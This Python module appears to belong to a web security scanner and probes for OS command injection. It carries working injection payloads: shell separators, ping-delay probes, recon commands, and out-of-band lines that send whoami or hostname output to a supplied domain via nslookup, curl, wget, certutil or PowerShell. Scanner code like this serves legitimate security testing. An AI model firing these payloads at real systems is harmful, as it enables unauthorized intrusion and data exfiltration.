"""
Command Injection scan methods
"""
"""
Shared imports for scan mixin modules.
"""
import json
import logging
import requests
import urllib.parse
import re
import concurrent.futures
import html as html_module
import time
from typing import Dict, Any, List, Optional, Tuple
from collections import defaultdict

logger = logging.getLogger(__name__)




# ─────────────────────────────────────────────────────────────────────────────
# CMDi payload registry — used by the scanner and the Payloads browser dialog
# ─────────────────────────────────────────────────────────────────────────────
_CMDI_OUTPUT_SIGNATURES: List[Tuple[str, str, str]] = [
    # whoami output
    (r'\broot\b',                            "whoami → root",          "Unix"),
    (r'\bwww-data\b',                        "whoami → www-data",      "Unix"),
    (r'\bnobody\b',                          "whoami → nobody",        "Unix"),
    (r'\badministrator\b',                   "whoami → administrator", "Windows"),
    (r'\bnt authority\\system\b',            "whoami → SYSTEM",        "Windows"),
    (r'\bnt authority\\network service\b',   "whoami → NetworkSvc",    "Windows"),
    # uname -a output
    (r'\bLinux\s+\S+\s+\d+\.\d+',           "uname -a output",        "Unix"),
    (r'\bDarwin\s+\S+\s+\d+\.\d+',          "uname -a macOS",         "Unix"),
    # ver / Windows version
    (r'Microsoft Windows \[Version',         "Windows ver output",     "Windows"),
    # ifconfig / ipconfig
    (r'inet addr:\d+\.\d+\.\d+\.\d+',       "ifconfig inet addr",     "Unix"),
    (r'inet \d+\.\d+\.\d+\.\d+',            "ifconfig inet",          "Unix"),
    (r'IPv4 Address[.\s]+:\s*\d+\.\d+',     "ipconfig IPv4",          "Windows"),
    # netstat
    (r'tcp\s+\d+\s+\d+\s+\S+:\d+',         "netstat tcp row",        "Unix"),
    (r'TCP\s+\d+\.\d+\.\d+\.\d+:\d+',      "netstat TCP row",        "Windows"),
    # ps -ef
    (r'UID\s+PID\s+PPID',                   "ps -ef header",          "Unix"),
    (r'root\s+1\s+0\s+',                    "ps -ef init row",        "Unix"),
    # tasklist
    (r'Image Name\s+PID\s+Session',         "tasklist header",        "Windows"),
    # shell error leaks
    (r'sh:\s*\d+:',                         "sh: error",              "Unix"),
    (r'/bin/sh:.*not found',                "sh: not found",          "Unix"),
    (r"'[^']+' is not recognized",          "Windows cmd error",      "Windows"),
    (r'The system cannot find',             "Windows file error",     "Windows"),
]

_CMDI_SEPARATOR_PAYLOADS = [
    # ── Both platforms ────────────────────────────────────────────
    ("amp",        "&",   "both"),
    ("amp_amp",    "&&",  "both"),
    ("pipe",       "|",   "both"),
    ("pipe_pipe",  "||",  "both"),
    # ── Unix only ────────────────────────────────────────────────
    ("semi",       ";",   "unix"),
    ("newline",    "\n",  "unix"),
    # ── Inline execution (Unix) ───────────────────────────────────
    ("backtick",   "`{CMD}`",          "unix"),
    ("dollar",     "$({CMD})",         "unix"),
    # ── Quote Breaking (New) ──────────────────────────────────────
    ("quote_semi", "'; {CMD}; '",      "unix"),
    ("dbl_quote_semi", '"; {CMD}; "',  "unix"),
    ("quote_pipe", "'| {CMD} |'",      "both"),
    ("dbl_quote_pipe", '"| {CMD} |"',  "both"),
]

_CMDI_TIME_PAYLOADS: List[Tuple[str, str, int, str]] = [
    # Unix — ping -c N sends N ICMP packets ≈ N seconds
    ("unix_ping_amp",      "& ping -c 5 127.0.0.1 &",          5,  "unix"),
    ("unix_ping_semi",     "; ping -c 5 127.0.0.1 ;",          5,  "unix"),
    ("unix_ping_pipe",     "| ping -c 5 127.0.0.1 |",          5,  "unix"),
    ("unix_ping_newline",  "\n ping -c 5 127.0.0.1 \n",        5,  "unix"),
    ("unix_ping_dollar",   "$(ping -c 5 127.0.0.1)",           5,  "unix"),
    ("unix_ping_backtick", "`ping -c 5 127.0.0.1`",            5,  "unix"),
    # Windows — ping -n N sends N packets ≈ N seconds
    ("win_ping_amp",       "& ping -n 5 127.0.0.1 &",          5,  "windows"),
    ("win_ping_pipe",      "| ping -n 5 127.0.0.1 |",          5,  "windows"),
    ("win_ping_amp_amp",   "&& ping -n 5 127.0.0.1",           5,  "windows"),
]

class CmdiScanMixin:
    """Mixin providing Command Injection scan methods."""

    def scan_cmdi(self) -> Dict[str, Any]:
        """
        Scan for OS Command Injection vulnerabilities.

        Three detection techniques:
          1. OUTPUT-BASED  — inject a command whose output appears verbatim in
                             the response (whoami, uname -a, etc.)
          2. TIME-BASED    — inject ping -c N / ping -n N and measure the delay
                             (blind injection — no output in response)
          3. ERROR-BASED   — inject syntax that causes a shell error message to
                             leak into the response

        Separators tested: & && | || ; \\n  and inline $() / ``
        Both Unix and Windows payloads are included.
        """
        self.scan_progress.emit("💉 Scanning for OS Command Injection...")

        # Generate a random token for safe echo detection
        import random, string
        echo_token = "HUNT_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

        # ── Output signatures ─────────────────────────────────────────────────
        # Each entry: (regex_pattern, description, platform)
        OUTPUT_SIGNATURES = _CMDI_OUTPUT_SIGNATURES

        # ── Payload matrix ────────────────────────────────────────────────────
        # Format: (name, payload_template, technique, platform)
        # {CMD} is replaced with the actual OS command.
        # Separators: & && | || ; \n  and inline execution

        SEPARATOR_PAYLOADS = _CMDI_SEPARATOR_PAYLOADS

        COMMANDS = {
            "unix": [
                ("echo",      f"echo {echo_token}"),
                ("whoami",    "whoami"),
                ("uname",     "uname -a"),
                ("ifconfig",  "ifconfig"),
                ("netstat",   "netstat -an"),
                ("ps",        "ps -ef"),
            ],
            "windows": [
                ("echo",      f"echo {echo_token}"),
                ("whoami",    "whoami"),
                ("ver",       "ver"),
                ("ipconfig",  "ipconfig /all"),
                ("netstat",   "netstat -an"),
                ("tasklist",  "tasklist"),
            ],
        }

        # ── Time-based blind payloads ─────────────────────────────────────────
        # Each injects a ping that sleeps for ~N seconds.
        # Format: (name, payload, expected_delay_seconds, platform)
        TIME_PAYLOADS = _CMDI_TIME_PAYLOADS
        TIME_THRESHOLD = 4.0   # seconds — flag if response ≥ this

        results: Dict[str, Any] = {
            "scan_type":   "CMDi",
            "vulnerable":  False,
            "details":     [],
            "summary":     "",
            "stats": {
                "output_payloads_tested": 0,
                "time_payloads_tested":   0,
                "output_hits":            0,
                "time_hits":              0,
                "oast_payloads_sent":     0,
            },
        }

        try:
            full_url = self.request_data.get("url", "")
            if not full_url:
                results["summary"] = "No URL provided."
                return results

            # ── Parse request ────────────────────────────────────────────
            request_text  = self.request_data.get("request_text", "")
            req_lines     = request_text.split("\n")
            method        = "GET"
            headers: Dict[str, str] = {}
            cookies: Dict[str, str] = {}
            body_content  = ""
            body_params: Dict[str, List[str]] = {}
            seen_cookie   = None

            if req_lines:
                first = req_lines[0].strip().upper()
                for m in ("POST", "PUT", "PATCH"):
                    if first.startswith(m):
                        method = m
                        break

            in_body = False
            for line in req_lines[1:]:
                stripped = line.strip()
                if not stripped and not in_body:
                    in_body = True
                    continue
                if in_body:
                    body_content += line + "\n"
                    continue
                if ":" in line:
                    k, v = line.split(":", 1)
                    k, v = k.strip(), v.strip()
                    if k.lower() == "cookie":
                        if seen_cookie is not None:
                            continue
                        seen_cookie = k
                        # Split on '; ' (RFC), then also on ', ' before next name=
                        raw_pairs = re.split(r';\s*', v)
                        expanded = []
                        for piece in raw_pairs:
                            sub = re.split(r',\s+(?=\w[^=]*=)', piece)
                            expanded.extend(s.strip() for s in sub if s.strip())
                        for pair in expanded:
                            if "=" in pair:
                                cn, cv = pair.split("=", 1)
                                cookies[cn.strip()] = cv.strip()
                    headers[k] = v

            body_content = body_content.strip()
            if method in ("POST", "PUT", "PATCH") and body_content:
                ct = headers.get("Content-Type", "").lower()
                if "application/json" in ct:
                    try:
                        j = json.loads(body_content)
                        if isinstance(j, dict):
                            body_params = {k: [str(v)] for k, v in j.items()}
                    except Exception:
                        pass
                else:
                    try:
                        body_params = urllib.parse.parse_qs(body_content)
                    except Exception:
                        pass

            parsed   = urllib.parse.urlparse(full_url)
            params   = urllib.parse.parse_qs(parsed.query)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            # Base headers — no Host, no Cookie (Cookie rebuilt per-request for cookie injection)
            base_headers = {k: v for k, v in headers.items()
                            if k.lower() not in ("host", "cookie")}

            # Full headers — base + Cookie header re-attached (used for non-cookie targets)
            clean_headers = dict(base_headers)
            if cookies:
                clean_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

            # ── Build injection points ────────────────────────────────────
            injection_points: List[Dict[str, Any]] = []

            # 1. URL query parameters (default)
            for pname, pvals in params.items():
                if not self._is_forced_point("url", pname):
                    self.scan_progress.emit(f"⏭️  Skipping URL param '{pname}' (not selected)")
                    continue
                injection_points.append({
                    "name": pname, "type": "URL Parameter",
                    "original": pvals[0] if pvals else "",
                })

            # 2. POST / body parameters (default when present, filtered by heuristic)
            for pname, pvals in body_params.items():
                val = pvals[0] if pvals else ""
                is_forced    = self._is_forced_point("body", pname)
                heuristic_ok, _ = self._should_test_body_param(pname, val)
                should_test = is_forced if self.forced_injection_points is not None else heuristic_ok
                if should_test:
                    injection_points.append({
                        "name": pname, "type": "POST Body",
                        "original": val,
                    })
                elif self.forced_injection_points is None:
                    self.scan_progress.emit(f"⏭️  Skipping body param '{pname}' (heuristic filter)")

            # 3. URL path segments (opt-in only)
            _ID_RE_CMDI = re.compile(
                r'^(?:\d+|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
                r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}|[0-9a-fA-F]{24,}|'
                r'[A-Za-z0-9_-]{8,}|v\d+(?:\.\d+)*|[A-Za-z0-9_-]+\.[A-Za-z0-9]+)$'
            )
            path_segs = [s for s in parsed.path.split("/") if s]
            for seg_idx, seg_val in enumerate(path_segs):
                if not _ID_RE_CMDI.match(seg_val):
                    continue
                if not self._is_forced_point("path", f"{seg_idx}:{seg_val}"):
                    continue  # opt-in only
                injection_points.append({
                    "name": f"path[{seg_idx}]", "type": "URL Path",
                    "original": seg_val,
                    "_path_segments": list(path_segs),
                    "_path_idx": seg_idx,
                })

            # 4. Cookies (opt-in only)
            for cname, cval in cookies.items():
                if not self._is_forced_point("cookie", cname):
                    continue  # opt-in only
                injection_points.append({
                    "name": cname, "type": "Cookie",
                    "original": cval,
                })

            # 5. HTTP headers (opt-in only)
            SKIP_HDRS = {"host", "cookie", "content-length", "transfer-encoding", "connection"}
            for hname, hval in headers.items():
                if hname.lower() in SKIP_HDRS:
                    continue
                if not self._is_forced_point("header", hname):
                    continue  # opt-in only
                injection_points.append({
                    "name": hname, "type": "HTTP Header",
                    "original": hval,
                })

            if not injection_points:
                results["summary"] = "No injection points found."
                return results

            self.scan_progress.emit(
                f"[*] CMDi scan started | Points: {len(injection_points)} | "
                f"Boost: {'ON' if self.boost_mode else 'OFF'}"
            )
            for i, pt in enumerate(injection_points, 1):
                self.scan_progress.emit(f"  [{i}] {pt['type']}: {pt['name']} = {pt['original'][:50]}")

            # ── Helper: rebuild request for any injection point type ──────
            def build_request(point: Dict, injected: str):
                """Return (url, req_headers, body) with injected value."""
                ptype = point["type"]

                if ptype == "URL Parameter":
                    tp = params.copy()
                    tp[point["name"]] = [point["original"] + injected]
                    qs = urllib.parse.urlencode(tp, doseq=True)
                    return f"{base_url}?{qs}", clean_headers, ""

                elif ptype == "POST Body":
                    tb = body_params.copy()
                    tb[point["name"]] = [point["original"] + injected]
                    ct = headers.get("Content-Type", "").lower()
                    if "application/json" in ct:
                        body = json.dumps({k: v[0] for k, v in tb.items()})
                    else:
                        body = urllib.parse.urlencode(tb, doseq=True)
                    return full_url, clean_headers, body

                elif ptype == "URL Path":
                    segs = list(point["_path_segments"])
                    segs[point["_path_idx"]] = urllib.parse.quote(
                        point["original"] + injected, safe=''
                    )
                    new_path = "/" + "/".join(segs)
                    url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, new_path,
                        parsed.params, parsed.query, parsed.fragment
                    ))
                    return url, clean_headers, ""

                elif ptype == "Cookie":
                    test_ck = dict(cookies)
                    test_ck[point["name"]] = point["original"] + injected
                    req_headers = dict(base_headers)
                    req_headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in test_ck.items())
                    return full_url, req_headers, ""

                else:  # HTTP Header
                    req_headers = dict(clean_headers)
                    req_headers[point["name"]] = point["original"] + injected
                    return full_url, req_headers, ""

            # ─────────────────────────────────────────────────────────────
            # PHASE 1: OUTPUT-BASED DETECTION
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[PHASE 1] Output-based OS Command Injection...")

            # Build full payload list: sep + command combos
            output_payloads: List[Tuple[str, str]] = []
            for sep_name, sep, platform in SEPARATOR_PAYLOADS:
                for plat, cmds in COMMANDS.items():
                    if platform not in ("both", plat):
                        continue
                    for cmd_name, cmd in cmds:
                        if "{CMD}" in sep:
                            raw = sep.replace("{CMD}", cmd)
                        else:
                            raw = f"{sep} {cmd}"
                        pname = f"{sep_name}_{plat}_{cmd_name}"
                        output_payloads.append((pname, raw))

            for point in injection_points:
                self.scan_progress.emit(
                    f"\n  🎯 Testing [{point['type']}] {point['name']}"
                )

                def _test_output(pname_payload):
                    pname, payload = pname_payload
                    url, req_hdrs, body = build_request(point, payload)
                    try:
                        resp = self.send_request_with_traffic(
                            url, req_hdrs, method=method, body=body,
                            payload=payload, payload_type=f"CMDi-Output-{point['name']}-{pname}"
                        )
                        if resp and hasattr(resp, "text"):
                            # ── Echo Token: distinguish execution from reflection ──
                            # If the app reflects param values (e.g. "No results for:
                            # & echo HUNT_xyz"), echo_token appears BUT with "echo "
                            # right before it — that's reflection, not execution.
                            # True command execution: the shell runs `echo HUNT_xyz`
                            # and outputs just "HUNT_xyz" with NO "echo " prefix.
                            # We scan every occurrence of echo_token in the response
                            # and require at least one that is NOT preceded by "echo ".
                            if echo_token in resp.text:
                                import re as _re
                                _executed = False
                                for _m in _re.finditer(_re.escape(echo_token), resp.text):
                                    # Grab up to 20 chars before the match
                                    _pre = resp.text[max(0, _m.start() - 20) : _m.start()].lower()
                                    # If the immediate preceding text is NOT "echo " or "echo\t",
                                    # this is genuine command output (not a reflection of the payload)
                                    if "echo " not in _pre and "echo\t" not in _pre:
                                        _executed = True
                                        break
                                if _executed:
                                    return {
                                        "technique":  "output (echo)",
                                        "parameter":  point["name"],
                                        "param_type": point["type"],
                                        "payload":    payload,
                                        "payload_name": pname,
                                        "signature":  f"Echoed token '{echo_token}'",
                                        "matched":    echo_token,
                                        "status_code": getattr(resp, "status_code", "?"),
                                        "response_length": len(getattr(resp, "content", b"")),
                                        "url":        url,
                                    }

                            for pattern, desc, plat in OUTPUT_SIGNATURES:
                                m = re.search(pattern, resp.text, re.IGNORECASE)
                                if m:
                                    return {
                                        "technique":  "output",
                                        "parameter":  point["name"],
                                        "param_type": point["type"],
                                        "payload":    payload,
                                        "payload_name": pname,
                                        "signature":  desc,
                                        "matched":    m.group(0)[:80],
                                        "status_code": getattr(resp, "status_code", "?"),
                                        "response_length": len(getattr(resp, "content", b"")),
                                        "url":        url,
                                    }
                    except Exception as e:
                        logger.debug(f"CMDi output error: {e}")
                    return None

                if self.boost_mode:
                    import threading as _threading
                    _cmdi_cancel = _threading.Event()

                    def _cmdi_output_worker(p, _c=_cmdi_cancel):
                        if _c.is_set():
                            return None
                        return _test_output(p)

                    with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as ex:
                        fmap = {}
                        for p in output_payloads:
                            if not self.running or _cmdi_cancel.is_set():
                                break
                            fmap[ex.submit(_cmdi_output_worker, p)] = p
                        for fut in concurrent.futures.as_completed(fmap):
                            if results["vulnerable"] and self.scan_stop_on_first:
                                _cmdi_cancel.set()
                                break
                            results["stats"]["output_payloads_tested"] += 1
                            try:
                                hit = fut.result(timeout=30)
                            except Exception:
                                hit = None
                            if hit:
                                results["vulnerable"] = True
                                results["stats"]["output_hits"] += 1
                                results["details"].append(hit)
                                self.scan_progress.emit(
                                    f"  ⚠️  CMDi FOUND! [{hit['payload_name']}] "
                                    f"signature='{hit['signature']}' matched='{hit['matched']}'"
                                )
                                if self.scan_stop_on_first:
                                    _cmdi_cancel.set()
                                    self.scan_progress.emit("  ⏭️  Stop-on-first: CMDi confirmed — cancelling remaining payloads")
                else:
                    for pname, payload in output_payloads:
                        if not self.running:
                            break
                        if results["vulnerable"] and self.scan_stop_on_first:
                            self.scan_progress.emit("  ⏭️  Stop-on-first: CMDi confirmed — stopping")
                            break
                        results["stats"]["output_payloads_tested"] += 1
                        hit = _test_output((pname, payload))
                        if hit:
                            results["vulnerable"] = True
                            results["stats"]["output_hits"] += 1
                            results["details"].append(hit)
                            self.scan_progress.emit(
                                f"  ⚠️  CMDi FOUND! [{pname}] "
                                f"signature='{hit['signature']}' matched='{hit['matched']}'"
                            )

            # ─────────────────────────────────────────────────────────────
            # PHASE 2: TIME-BASED BLIND DETECTION
            # ─────────────────────────────────────────────────────────────
            self.scan_progress.emit("\n[PHASE 2] Blind OS Command Injection (time-based)...")
            self.scan_progress.emit(
                f"  ℹ️  Threshold: ≥{TIME_THRESHOLD}s delay flags injection "
                f"(ping -c/-n 5 ≈ 5s)"
            )

            # Suppress inter-request delay and auto-raise timeout for timing accuracy
            _cmdi_saved_delay   = self.scan_req_delay
            _cmdi_saved_timeout = self.scan_timeout
            self.scan_req_delay = 0.0
            if self.scan_timeout < 20:
                self.scan_timeout = 20
                self.scan_progress.emit(
                    f"  ℹ️  Time-based: timeout auto-raised to 20s (was {_cmdi_saved_timeout}s)"
                )
            if _cmdi_saved_delay > 0:
                self.scan_progress.emit(
                    f"  ℹ️  Time-based: inter-request delay suppressed for timing accuracy"
                )

            for point in injection_points:
                self.scan_progress.emit(
                    f"\n  🎯 Testing [{point['type']}] {point['name']}"
                )
                for t_name, t_payload, expected, plat in TIME_PAYLOADS:
                    if not self.running:
                        break
                    results["stats"]["time_payloads_tested"] += 1
                    url, req_hdrs, body = build_request(point, t_payload)

                    t0 = time.time()
                    try:
                        resp = self.send_request_with_traffic(
                            url, req_hdrs, method=method, body=body,
                            payload=t_payload,
                            payload_type=f"CMDi-Time-{point['name']}-{t_name}"
                        )
                    except Exception:
                        resp = None
                    elapsed = time.time() - t0

                    if elapsed >= TIME_THRESHOLD:
                        # ── Confirmation probe ────────────────────────────────────
                        # Repeat the same payload. A single delay could be server load.
                        # If the delay repeats, it's genuine injection. If not, jitter.
                        self.scan_progress.emit(
                            f"    [{t_name}] elapsed={elapsed:.2f}s ≥ threshold={TIME_THRESHOLD}s "
                            f"— repeating to confirm..."
                        )
                        c_url, c_hdrs, c_body = build_request(point, t_payload)
                        t1 = time.time()
                        try:
                            self.send_request_with_traffic(
                                c_url, c_hdrs, method=method, body=c_body,
                                payload=t_payload,
                                payload_type=f"CMDi-TimeConfirm-{point['name']}-{t_name}"
                            )
                        except Exception:
                            pass
                        confirm_elapsed = time.time() - t1

                        if confirm_elapsed >= TIME_THRESHOLD:
                            results["vulnerable"] = True
                            results["stats"]["time_hits"] += 1
                            hit = {
                                "technique":       "time-based",
                                "parameter":       point["name"],
                                "param_type":      point["type"],
                                "payload":         t_payload,
                                "payload_name":    t_name,
                                "platform":        plat,
                                "elapsed":         round(elapsed, 2),
                                "confirm_elapsed": round(confirm_elapsed, 2),
                                "threshold":       TIME_THRESHOLD,
                                "status_code":     getattr(resp, "status_code", "?") if resp else "?",
                                "url":             url,
                            }
                            results["details"].append(hit)
                            self.scan_progress.emit(
                                f"  ⚠️  BLIND CMDi CONFIRMED! [{t_name}] "
                                f"1st={elapsed:.2f}s, 2nd={confirm_elapsed:.2f}s "
                                f"(threshold={TIME_THRESHOLD}s)"
                            )
                        else:
                            self.scan_progress.emit(
                                f"  ⚠️  CMDi [{t_name}]: 1st probe delayed ({elapsed:.2f}s) "
                                f"but 2nd did NOT ({confirm_elapsed:.2f}s < {TIME_THRESHOLD}s) "
                                f"— likely server jitter, skipping"
                            )
                    else:
                        self.scan_progress.emit(
                            f"    [{t_name}] elapsed={elapsed:.2f}s "
                            f"(threshold={TIME_THRESHOLD}s)"
                        )

            # Restore speed settings after time-based phase
            self.scan_req_delay = _cmdi_saved_delay
            self.scan_timeout   = _cmdi_saved_timeout

            # ─────────────────────────────────────────────────────────────
            # PHASE 3: OUT-OF-BAND (OAST) DETECTION
            # ─────────────────────────────────────────────────────────────
            if self.oast_url:
                self.scan_progress.emit("\n[PHASE 3] Out-of-Band (OAST) OS Command Injection via DNS...")
                self.scan_progress.emit(f"  ℹ️  Interactsh hostname: {self.oast_url}")
                self.scan_progress.emit("  ℹ️  Monitor https://app.interactsh.com/ for incoming DNS interactions.")

                # Normalise: accept either a bare hostname or a full URL
                try:
                    raw_input = self.oast_url.strip()
                    # Strip scheme if the user accidentally pasted a full URL
                    if "://" in raw_input:
                        parsed_oast = urllib.parse.urlparse(raw_input)
                        oast_domain = parsed_oast.netloc or parsed_oast.path
                    else:
                        oast_domain = raw_input
                    # Strip port if present
                    if ':' in oast_domain:
                        oast_domain = oast_domain.split(':')[0]
                    # Strip trailing slashes / paths
                    oast_domain = oast_domain.split('/')[0].strip()
                    if not oast_domain:
                        oast_domain = raw_input
                except Exception:
                    oast_domain = self.oast_url

                self.scan_progress.emit(f"  ℹ️  Resolved OAST domain: {oast_domain}")

                # DNS-based OAST templates (interactsh captures DNS lookups)
                # {DOMAIN}       → bare interactsh hostname, e.g. kgji2ohoyw.oast.fun
                # {EXFIL_DOMAIN} → whoami/username prepended as subdomain for data exfil
                OAST_TEMPLATES = [
                    # ── Plain DNS ping ──
                    ("nslookup",              "nslookup {DOMAIN}"),
                    ("nslookup_win",          "nslookup {DOMAIN}"),
                    # ── Data-exfil via DNS subdomain (Unix) ──
                    ("nslookup_exfil_unix",   "nslookup `whoami`.{DOMAIN}"),
                    ("nslookup_id_unix",      "nslookup `id`.{DOMAIN}"),
                    ("nslookup_hostname",     "nslookup `hostname`.{DOMAIN}"),
                    # ── Data-exfil via DNS subdomain (Windows) ──
                    ("nslookup_exfil_win",    "nslookup %USERNAME%.{DOMAIN}"),
                    ("nslookup_computername", "nslookup %COMPUTERNAME%.{DOMAIN}"),
                    # ── curl / wget HTTP fallback ──
                    ("curl",                  "curl http://{DOMAIN}"),
                    ("wget",                  "wget http://{DOMAIN}"),
                    ("curl_exfil",            "curl \"http://{DOMAIN}/?d=$(whoami)\""),
                    ("wget_exfil",            "wget \"http://{DOMAIN}/?d=$(whoami)\""),
                    # ── Windows HTTP fallback ──
                    ("certutil",              "certutil -urlcache -split -f http://{DOMAIN}/a"),
                    ("powershell",            "powershell -c \"Invoke-WebRequest -Uri http://{DOMAIN}\""),
                ]

                oast_payloads = []
                for sep_name, sep, platform in SEPARATOR_PAYLOADS:
                    for cmd_name, cmd_tmpl in OAST_TEMPLATES:
                        # Platform filtering
                        _unix_only  = {"curl", "wget", "curl_exfil", "wget_exfil",
                                       "nslookup_exfil_unix", "nslookup_id_unix", "nslookup_hostname"}
                        _win_only   = {"certutil", "powershell",
                                       "nslookup_exfil_win", "nslookup_computername"}
                        if platform == "unix"    and cmd_name in _win_only:  continue
                        if platform == "windows" and cmd_name in _unix_only: continue

                        cmd = cmd_tmpl.replace("{DOMAIN}", oast_domain)

                        if "{CMD}" in sep:
                            raw = sep.replace("{CMD}", cmd)
                        else:
                            raw = f"{sep} {cmd}"

                        pname = f"{sep_name}_{cmd_name}"
                        oast_payloads.append((pname, raw))
                        self.scan_progress.emit(f"    ↳ Payload queued: {raw}")

                for point in injection_points:
                    self.scan_progress.emit(f"\n  🎯 Testing [{point['type']}] {point['name']} with OAST payloads")
                    
                    def _send_oast(pname_payload):
                        pname, payload = pname_payload
                        url, req_hdrs, body = build_request(point, payload)
                        try:
                            self.send_request_with_traffic(
                                url, req_hdrs, method=method, body=body,
                                payload=payload, payload_type=f"CMDi-OAST-{point['name']}-{pname}"
                            )
                            return True
                        except Exception:
                            return False

                    if self.boost_mode:
                        with concurrent.futures.ThreadPoolExecutor(max_workers=getattr(self, "scan_max_workers", 8)) as ex:
                            fmap = {ex.submit(_send_oast, p): p for p in oast_payloads if self.running}
                            for fut in concurrent.futures.as_completed(fmap):
                                results["stats"]["oast_payloads_sent"] += 1
                    else:
                        for pname, payload in oast_payloads:
                            if not self.running: break
                            results["stats"]["oast_payloads_sent"] += 1
                            _send_oast((pname, payload))

        except Exception as e:
            logger.error(f"CMDi scan error: {e}")
            results["error"] = str(e)

        # ── Summary ───────────────────────────────────────────────────────────
        n = len(results["details"])
        if results["vulnerable"]:
            output_hits = results["stats"]["output_hits"]
            time_hits   = results["stats"]["time_hits"]
            parts = []
            if output_hits:
                parts.append(f"{output_hits} output-based")
            if time_hits:
                parts.append(f"{time_hits} time-based blind")
            results["summary"] = (
                f"OS Command Injection CONFIRMED — {n} finding(s): "
                + ", ".join(parts)
            )
        else:
            results["summary"] = "No OS Command Injection vulnerabilities detected."

        self.scan_progress.emit(f"\n{'='*60}")
        self.scan_progress.emit(f"📋 CMDi SCAN COMPLETE: {results['summary']}")
        self.scan_progress.emit(f"{'='*60}")
        return results